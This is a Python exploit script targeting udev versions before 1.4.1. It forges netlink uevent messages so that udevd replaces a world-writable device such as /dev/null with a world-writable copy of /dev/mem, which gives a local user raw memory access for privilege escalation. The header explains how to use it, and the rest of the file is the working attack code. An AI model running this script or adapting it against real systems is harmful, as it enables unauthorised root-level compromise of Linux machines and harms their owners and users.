# UDEV < 1.4.1 local exploit / noexec version
# 
# In order to exploit the vulnerability this code requires the pid
# of the netlink socket (usually found in /proc/net/netlink) and a
# device that is to be replaced by /dev/mem. The given device should
# be world writable and should belong to the sysfs memory class 
# (take a look at /sys/class/mem). Valid devices are /dev/null, 
# /dev/zero, /dev/random, /dev/urandom and /dev/full. Before using
# this exploit make sure the device you chose to replace is indeed
# world writable.
# 
# Be warned that this exploit will not give you root. It will just 
# replace the given device with a copy /dev/mem that will be world
# writable. This will allow you to perform raw I/O and possibly
# elevate your privileges :-) 
# 
# Have fun
# huku <huku _at_ grhack _dot_ net>
import os, sys
from ctypes import *
from stat import *

print "UDEV < 1.4.1 LOCAL EXPLOIT / NOEXEC VERSION"

if len(sys.argv) != 3:
  print sys.argv[0] + " <pid> <device_to_replace>"
  quit()

pid = int(sys.argv[1])
print "# Using netlink socket pid " + str(pid)

device = sys.argv[2]
base = device[device.rindex("/") + 1:]
if not os.path.exists("/sys/class/mem/" + base):
  print "# Cannot find the given device in sysfs vulnerable class... RTFM"
  quit()

device = os.stat(sys.argv[2]).st_rdev
major = device >> 8
minor = device & 0x0f
print "# Replacing device / BASE=" + base + " MAJOR=" + str(major) + " MINOR=" + str(minor)

# Load the libc library.
libc = CDLL("libc.so.6")

# Constants used to create a netlink socket.
PF_NETLINK = 16
SOCK_DGRAM = 2
NETLINK_KOBJECT_UEVENT = 15

fd = libc.socket(PF_NETLINK, SOCK_DGRAM, NETLINK_KOBJECT_UEVENT)
if fd <= 0: 
  print "# Could not create netlink socket"
  print libc.perror("socket")
  quit()

# Create a placeholder for sockaddr_nl.
class sockaddr_nl (Structure):
  _fields_ = [("nl_family", c_ushort),
              ("nl_pad", c_ushort),
              ("nl_pid", c_ulong),
              ("nl_groups", c_ulong)]

# Bind the socket. I think this is not needed and it's actually
# not that correct since bind() returns 'Address already in use'.
nl = sockaddr_nl(PF_NETLINK, 0, pid, 0)
libc.bind(fd, pointer(nl), sizeof(nl))

print "# Netlink socket ok"

# Placeholder for iovec structure.
class iovec (Structure):
  _fields_ = [("iov_base", c_char_p),
              ("iov_len", c_ulong)]

# Placeholder for msghdr structure.
class msghdr (Structure):
  _fields_ = [("msg_name", POINTER(sockaddr_nl)),
              ("msg_namelen", c_ulong),
              ("msg_iov", POINTER(iovec)),
              ("msg_iovlen", c_ulong),
              ("msg_control", c_void_p),
              ("msg_controllen", c_ulong),
              ("msg_flags", c_int)]

# Construct the message to send to udevd.
event = "add@/class/mem/" + base + "\0" + \
  "ACTION=add\0" + \
  "DEVPATH=/class/mem/" + base + "\0" + \
  "SUBSYSTEM=mem\0" + \
  "MAJOR=1\0" + \
  "MINOR=1\0" + \
  "SEQNUM=1337\0" + \
  "TIMEOUT=1337\0"

print "# Requesting device creation"
iov = iovec(event, len(event))
msg = msghdr(pointer(nl), sizeof(nl), pointer(iov), 1, c_void_p(), 0, 0)
libc.sendmsg(fd, pointer(msg), 0)

print "# Press enter to restore the device"
raw_input()

event = "add@/class/mem/" + base + "\0" + \
  "ACTION=add\0" + \
  "DEVPATH=/class/mem/" + base + "\0" + \
  "SUBSYSTEM=mem\0" + \
  "MAJOR=" + str(major) + "\0" + \
  "MINOR=" + str(minor) + "\0" + \
  "SEQNUM=1337\0" + \
  "TIMEOUT=1337\0"

print "# Restoring device"
iov = iovec(event, len(event))
msg = msghdr(pointer(nl), sizeof(nl), pointer(iov), 1, c_void_p(), 0, 0)
libc.sendmsg(fd, pointer(msg), 0)

print "# Done"
libc.close(fd)
quit()

